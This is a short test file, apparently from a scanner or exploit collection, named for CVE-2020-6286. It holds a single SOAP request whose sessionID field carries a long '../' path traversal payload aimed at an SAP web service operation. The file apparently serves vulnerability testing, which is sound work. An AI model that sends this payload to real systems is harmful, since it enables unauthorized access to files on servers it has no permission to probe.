tests/CVE-2020-6286/test1.txt

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:queryProtocol>
         <sessionID>/../../../../../../../../../../../../../../../../../..test.txt</sessionID>
      </urn:queryProtocol>
   </soapenv:Body>
</soapenv:Envelope>